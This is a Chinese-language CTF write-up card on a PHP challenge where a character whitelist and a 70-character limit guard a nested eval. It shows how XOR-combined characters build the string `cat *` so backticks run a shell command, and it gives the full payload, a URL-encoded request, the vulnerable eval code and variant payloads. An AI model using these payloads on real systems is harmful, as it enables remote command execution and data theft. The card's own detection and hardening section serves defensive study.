---
id: ctf-web-php-double-eval-xor-backtick-command
title: PHP 双重 eval + 字符白名单：用异或块在 70 字符内拼出 `cat *` 执行命令
type: scenario
domain: ctf
path: ctf/web
technique: php-double-eval-xor-backtick-command
aliases:
- RCEME
- PHP 异或 RCE
- 双重 eval
- 字符白名单绕过
- 70 字符限制
- 反引号命令执行
tags:
- ctf
- web
- php
- rce
- xor
- eval
- whitelist-bypass
- length-limit
- backtick
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V216
  verified_at: '2026-11-07T04:44:38+08:00'
  notes: 已对照原文 RCEME 与图22/23核对：白名单正则、长度≤70、双重eval、XOR块实测复算 '|||'^'...'^'213'='`ca'、'*~'^'^^'='t '、'|'^'.'^'2'='`'，拼接为 `cat *`，payload总长49（已修正卡内“约60”）；响应出现PHP源码与flag。未验证点：未对题目环境发请求复跑；PHP版本/disable_functions以题目为准；frontmatter无sources/source_url。dup-scan pair 5 与18956正则反斜杠绕过卡机制不同，均保留。
---

## 一句话结论

当 `calc` 被白名单限制为数字、`+ - * / ^ ~ & |`、括号、单引号和点号且长度 ≤70，代码又是 `eval("echo ".eval("return ".$calc.";").";")` 时，可以用 `^` 把白名单字符异或成反引号、字母和空格，拼出字符串 `` `cat *` ``；内层 eval 返回该字符串，外层 eval 把它当 PHP 代码执行，反引号触发 shell 命令并回显当前目录文件内容（含 flag）。

## 原理

- **双重 eval**：内层 `eval("return ".$calc.";")` 先对用户表达式求值，得到一个字符串；外层 `eval("echo <该字符串>;")` 再把字符串当 PHP 代码执行。因此内层只需“构造出要执行的代码字符串”，不必直接执行敏感函数。
- **异或构造**：PHP 的字符串 `^` 按字符逐位异或，长度取较短者。白名单允许 `|`、`.`、`*`、`~`、`^`、数字、单引号、点和括号，这些字符的异或组合可以生成反引号、字母和空格。例如：
  - `'|||' ^ '...'` = `"RRR"`（0x7c ^ 0x2e = 0x52），再 `^ '213'` 得到 `` "`ca" ``；
  - `'*~' ^ '^^'` = `"t "`（0x2a ^ 0x5e = 0x74，0x7e ^ 0x5e = 0x20）；
  - `'*'` 原样保留；
  - `'|' ^ '.' ^ '2'` = `` "`" ``。
  拼接得到 `` `cat *` ``，该 payload 总长度 49，满足 ≤70。
- **反引号执行**：外层 eval 执行 `` echo `cat *`; ``，PHP 的反引号是 shell 命令替换，等价于 `shell_exec("cat *")`；`cat *` 读取当前目录所有文件，输出中即包含 flag。
- 为什么成立：白名单只限制“输入字符”，没有限制“运行时生成的字符”；`^`、`.`、`~` 足以构造任意 ASCII。长度限制可通过复用短块和减少变量名规避。

## 触发条件

- `calc` 直接进入双重 eval，未做其他转义/过滤；白名单允许 `^`、`.`、`~`、单引号、括号。
- 输入长度 ≤70（或可通过分块/短变量绕过）。
- PHP 未禁用 `shell_exec`/反引号（`disable_functions` 不包含相关函数），且 Web 进程有权限读取 flag 文件。
- 目标 PHP 版本支持字符串异或（PHP 5/7/8 均支持）。

## 利用步骤

1. 读源码确认白名单正则、长度限制与双重 eval 结构。
2. 用白名单字符异或构造目标字符串。最短路径通常是构造反引号命令（`` `cat *` ``、`` `cat /flag` ``）而不是长函数名。
3. 用 `.` 拼接各块，确保总长度 ≤70；必要时用 `~` 取反单个字符缩短。
4. URL 编码后请求 `?calc=<payload>`，观察外层 eval 是否把构造串当代码执行。
5. 从响应中提取文件内容/flag；若 `cat *` 输出过多，改用 `` `cat flag.php` `` 或 `ls` 先定位。

## PoC

```text
calc = ('|||'^'...'^'213') . ('*~'^'^^') . '*' . ('|'^'.'^'2')
# 计算过程：
# '|||' ^ '...'            -> "RRR"
# "RRR" ^ "213"            -> "`ca"
# '^' 拼接后：
# ('*~' ^ '^^')            -> "t "
# '*'                      -> "*"
# ('|' ^ '.' ^ '2')        -> "`"
# 结果："`cat *`"
```

```http
GET /?calc=%28%27%7C%7C%7C%27%5E%27...%27%5E%27213%27%29.%28%27*~%27%5E%27%5E%5E%27%29.%27*%27.%28%27%7C%27%5E%27.%27%5E%272%27%29 HTTP/1.1
Host: target
```

```php
// 服务端等价逻辑（题目源码）
$wl = preg_match('/^[0-9+\-*\/\(\)\.\'\^~\\\\\&\|]+$/i', $_GET["calc"]);
if ($wl === 0 || strlen($_GET["calc"]) > 70) die("try again");
eval("echo ".eval("return ".$_GET["calc"].";").";");
```

## 变体与关联

- 变体：用同样的异或块构造 `file_get_contents('flag')`、`system('cat /flag')`、`phpinfo()` 等；构造 `$_GET[0]` 之类的变量名可进一步缩短。
- 变体：若反引号/命令函数被禁，可构造 `include`/`highlight_file` 读源码，或利用 `assert`、`preg_replace /e`（旧 PHP）等。
- 变体：长度限制更严时，用 `~` 取反、短变量、重复利用返回值；或把长 payload 拆成多次请求写入 session/文件。
- 关联：[[web-php-rce-no-alnum-self-increment-variable-function]]（无字母数字自增构造）、[[web-php-rce-four-char-command-length-bypass]]（超短命令长度绕过）、[[ctf-web-php-weak-compare-php-filter-data-wrapper]]（同为 PHP 代码审计 CTF 链）。
- 边界：`disable_functions` 禁用 `shell_exec`/反引号时失效；`open_basedir` 限制文件读取范围；长度限制按字节计算时需重新核算 URL 编码前的长度。

## 检测与防御

- **检测（CTF）**：`calc` 参数出现大量 `^`、`~`、`.` 组合与单引号；长度接近 70；响应出现目录列表/源码；双重 eval 结构本身就是高危信号。
- **修复（真实代码）**：不要对用户输入使用 `eval`；如必须做表达式求值，使用白名单 AST 解析器（如 Symfony ExpressionLanguage）并禁用字符串异或/反引号。
- **加固**：`disable_functions` 禁用 `shell_exec`、`exec`、`system`、`passthru`、反引号；`open_basedir` 限制；WAF 检测 `^` 异或串与反引号；代码审计重点搜索 `eval` 嵌套。
